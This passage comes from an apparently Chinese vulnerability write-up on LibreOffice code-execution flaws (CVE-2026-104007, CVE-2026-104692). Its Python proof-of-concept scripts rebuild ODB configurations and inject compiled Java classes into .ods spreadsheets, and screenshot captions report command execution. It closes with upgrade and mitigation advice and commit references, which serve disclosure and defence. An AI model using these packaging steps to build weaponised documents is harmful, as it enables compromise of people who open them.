src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142422-b1a246c3-e318-1.png&amp;mode=full&amp;exp=1795392000&amp;sig=904825fd1461bbee\" loading=\"lazy\" decoding=\"async\" width=\"393.3333333333333\"></p><h5>1.2. 生成ODB数据库配置文件</h5><pre><code># -*- coding: utf-8 -*-\n\"\"\"Rebuild ODBs for a given mode (default call; connect for RCE-proof round).\"\"\"\nimport sys, os\nsys.path.insert(0, r\"C:\\lo-lab\\lab\")\n\nMODE = sys.argv[1] if len(sys.argv) &gt; 1 else \"call\"\nfor tag in (\"2626\", \"2627\"):\n    sys.argv = [\"build_doc.py\", tag, MODE]\n    src = open(r\"C:\\lo-lab\\lab\\build_doc.py\", encoding=\"utf-8\").read()\n    g = {\"__name__\": \"build_doc_module\", \"__file__\": r\"C:\\lo-lab\\lab\\build_doc.py\"}\n    exec(compile(src.split('if __name__')[0], \"build_doc.py\", \"exec\"), g)\n    os.makedirs(g[\"OUT\"], exist_ok=True)\n    print(\"rebuilt:\", g[\"build_odb\"]())\n</code></pre><pre><code>E:\\appinstall\\python116\\python.exe C:\\lo-lab\\lab\\rebuild_odb.py</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142422-b1d5f8a4-e318-1.png&amp;mode=full&amp;exp=1795392000&amp;sig=5b72106ccdd3c59a\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142422-b1d5f8a4-e318-1.png&amp;mode=thumb&amp;exp=1795392000&amp;sig=5e73bdef12f925d5 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142422-b1d5f8a4-e318-1.png&amp;mode=image-1200&amp;exp=1795392000&amp;sig=2de93655cca84f6b 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142422-b1d5f8a4-e318-1.png&amp;mode=full&amp;exp=1795392000&amp;sig=5b72106ccdd3c59a 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"820\"></p><h5>1.3. 打包成表格压缩包</h5><p>同时在包的 manifest 清单里登记，把编译好的 <code>lab\\*.class</code> 塞进 4 个表格压缩包里</p><pre><code># -*- coding: utf-8 -*-\n\"\"\"Inject lab/*.class into every poc-*.ods AND declare them in META-INF/manifest.xml\n(LO rejects package entries that are not listed in the manifest).\"\"\"\nimport glob, os, zipfile\n\nCLASSES = {}\nfor f in glob.glob(r\"C:\\lo-lab\\lab\\classes\\lab\\*.class\"):\n    CLASSES[\"lab/\" + os.path.basename(f)] = open(f, \"rb\").read()\nENTRIES = \"\".join(\n    '&lt;manifest:file-entry manifest:full-path=\"%s\" manifest:media-type=\"application/octet-stream\"/&gt;' % name\n    for name in CLASSES)\n\nfor src in glob.glob(r\"C:\\lo-lab\\payload\\poc-*.ods\"):\n    tmp = src + \".new\"\n    with zipfile.ZipFile(src) as oz, zipfile.ZipFile(tmp, \"w\") as nz:\n        for info in oz.infolist():\n            if info.filename in CLASSES:   # 幂等：旧的 lab/*.class 条目跳过，统一重写\n                continue\n            data = oz.read(info.filename)\n            if info.filename == \"META-INF/manifest.xml\":\n                text = data.decode(\"utf-8\")\n                for name in CLASSES:\n                    if name not in text:\n                        text = text.replace(\"&lt;/manifest:manifest&gt;\", ENTRIES + \"&lt;/manifest:manifest&gt;\")\n                data = text.encode(\"utf-8\")\n            nz.writestr(info, data)\n        for name, cls in CLASSES.items():\n            nz.writestr(name, cls)\n    os.replace(tmp, src)\n    print(\"injected+manifested:\", src, sorted(CLASSES))\n</code></pre><pre><code>E:\\appinstall\\python116\\python.exe C:\\lo-lab\\lab\\inject.py</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142423-b21ed47a-e318-1.png&amp;mode=full&amp;exp=1795392000&amp;sig=6f5bc6ae6ce3ccdc\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142423-b21ed47a-e318-1.png&amp;mode=thumb&amp;exp=1795392000&amp;sig=6c7cf6017f4bc586 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142423-b21ed47a-e318-1.png&amp;mode=image-1200&amp;exp=1795392000&amp;sig=f4da705c7b60fc8d 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142423-b21ed47a-e318-1.png&amp;mode=full&amp;exp=1795392000&amp;sig=6f5bc6ae6ce3ccdc 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"820\"></p><h3 id=\"sec-22\">CVE-2026-104007</h3><p>双击运行soffice.com将会启动LibreOffice</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142423-b26729ef-e318-1.png&amp;mode=full&amp;exp=1795392000&amp;sig=be5563213af6a77a\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142423-b26729ef-e318-1.png&amp;mode=thumb&amp;exp=1795392000&amp;sig=eda544fd1db21362 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142423-b26729ef-e318-1.png&amp;mode=image-1200&amp;exp=1795392000&amp;sig=1816fff9f4d38701 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142423-b26729ef-e318-1.png&amp;mode=full&amp;exp=1795392000&amp;sig=be5563213af6a77a 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"832\"></p><p>打开文件</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142424-b2b6b3bc-e318-1.png&amp;mode=full&amp;exp=1795392000&amp;sig=3b7476645092a2da\" loading=\"lazy\" decoding=\"async\" width=\"833.3333333333334\"></p><p>成功执行命令</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142424-b303b771-e318-1.png&amp;mode=full&amp;exp=1795392000&amp;sig=055fac3adbbb1a84\" loading=\"lazy\" decoding=\"async\" width=\"833.3333333333334\"></p><h3 id=\"sec-23\">CVE-2026-104692</h3><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261118142425-b367b88d-e318-1.png&amp;mode=full&amp;exp=1795392000&amp;sig=6f4b096d1c22eb4b\" loading=\"lazy\" decoding=\"async\" width=\"833.3333333333334\"></p><h2 id=\"sec-24\">九、修复措施</h2><p>升到 26.2.7 或 26.8.2。类路径在 <code>setPropertyInfo()</code> 里删，名单在 HSQLDB 的静态字段里改，两处都在这两个版本里。26.8.2 上的三个提交和 26.2.7 不是同一个 SHA，基本信息表里按分支列开了。</p><p>暂时不能升级、又不用 Java 连数据库时，把 LibreOffice 的 Java 关掉。JDBC 驱动加载不起来，<code>connect()</code> 和 <code>CALL</code> 都走不到。Base 里依赖 Java 的功能会一起停用。</p><p>26.2.7.3 仍会按 <code>form:datasource</code> 去 GET odb。日志里只有下载，对应的 class 没有被加载</p><h2 id=\"sec-25\">参考</h2><ul><li><p>官方通告：<a href=\"https://www.libreoffice.org/security/\">https://www.libreoffice.org/security/</a></p></li></ul><ul><li><p>26.2.6.2 导入时把文档设置合并进驱动配置：<a href=\"https://github.com/LibreOffice/core/blob/libreoffice-26.2.6.2/dbaccess/source/filter/xml/xmlfilter.cxx\">https://github.com/LibreOffice/core/blob/libreoffice-26.2.6.2/dbaccess/source/filter/xml/xmlfilter.cxx</a></p></li><li><p>26.2.6.2 把 <code>db:java-classpath</code> 收成 <code>JavaDriverClassPath</code>：<a href=\"https://github.com/LibreOffice/core/blob/libreoffice-26.2.6.2/dbaccess/source/filter/xml/xmlDataSource.cxx\">https://github.com/LibreOffice/core/blob/libreoffice-26.2.6.2/dbaccess/source/filter/xml/xmlDataSource.cxx</a></p></li><li><p>26.2.7.3 <code>construct()</code> 仍优先使用 info 里的类路径：<a href=\"https://github.com/LibreOffice/core/blob/libreoffice-26.2.7.3/connectivity/source/drivers/jdbc/JConnection.cxx\">https://github.com/LibreOffice/core/blob/libreoffice-26.2.7.3/connectivity/source/drivers/jdbc/JConnection.cxx</a></p></li><li><p>26.2.7 去掉文档中的 JavaDriverClassPath：<a href=\"https://github.com/LibreOffice/core/commit/85e3ff48ac9b067a5455b35a4024723a0884c301\">https://github.com/LibreOffice/core/commit/85e3ff48ac9b067a5455b35a4024723a0884c301</a></p></li><li><p>26.2.7 去掉文档中的 SystemProperties：<a href=\"https://github.com/LibreOffice/core/commit/a80a37b8dc4cc89a1f45ba456d58ee441786372c\">https://github.com/LibreOffice/core/commit/a80a37b8dc4cc89a1f45ba456d58ee441786372c</a></p></li><li><p>26.2.7 把未设置的 HSQLDB 方法名单当成空名单：<a href=\"https://github.com/LibreOffice/core/commit/527a74907d7b76b354ff8be025ca6d22d1a3e874\">https://github.com/LibreOffice/core/commit/527a74907d7b76b354ff8be025ca6d22d1a3e874</a></p></li><li><p>26.8.2 类路径：<a href=\"https://github.com/LibreOffice/core/commit/4146790943d892df679576b76410d76405fac750\">https://github.com/LibreOffice/core/commit/4146790943d892df679576b76410d76405fac750</a></p></li><li><p>26.8.2 SystemProperties：<a href=\"https://github.com/LibreOffice/core/commit/5985a323645c8a153c1ae0a9becc85eebd128911\">https://github.com/LibreOffice/core/commit/5985a323645c8a153c1ae0a9becc85eebd128911</a></p></li><li><p>26.8.2 HSQLDB：<a href=\"https://github.com/LibreOffice/core/commit/90c3fd97cd4cceaeff02671f4706713069be5a79\">https://github.com/LibreOffice/core/commit/90c3fd97cd4cceaeff02671f4706713069be5a79</a></p></li></ul>","original","zhKind","complete","漏洞分析","复现","漏洞利用","利用链","https://xz.aliyun.com/news/93387","先知社区",{"_159":160,"_161":-5},"changelogVersion","2026-10-01T08:00","release"]
